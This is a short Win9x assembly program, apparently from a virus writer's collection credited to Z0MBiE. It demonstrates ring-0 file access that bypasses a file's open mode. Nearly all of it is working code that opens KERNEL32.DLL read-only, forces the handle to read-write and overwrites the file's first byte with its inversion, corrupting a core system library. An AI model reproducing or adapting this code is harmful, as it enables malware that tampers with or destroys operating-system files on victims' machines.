
; This is an example of changing open mode for opened files under Win9X.
; action:
; invert first byte of KERNEL32.DLL.

; (x) 2000 Z0MBiE, http://z0mbie.cjb.net

callW                   macro   x
                        extern  x:proc
                        call    x
                        endm

include                 consts.inc

                        p386
                        model   flat
                        locals  __
                        jumps

                        .data

filename                db      'C:\WINDOWS\SYSTEM\KERNEL32.DLL',0

buf                     db      4096 dup (?)

                        .code
start:
                        call    callring0

                        push    -1
                        callW   ExitProcess

ring0handler:           pusha

;                       int 3

                        lea     edx, filename
                        call    r0_fopen_ro  ; open in read-only mode
                        xchg    ebx, eax

                        call    r0_make_handle_rw  ; set mode to read-write

                        lea     edx, buf
                        mov     ecx, size buf
                        xor     esi, esi      ; filepos
                        call    r0_fread

                        not     byte ptr buf

                        call    r0_fwrite

                        call    r0_fclose

__exit:                 popa
                        ret

include                 seh.inc
include                 ring0.inc
include                 r0io.inc

                        end     start
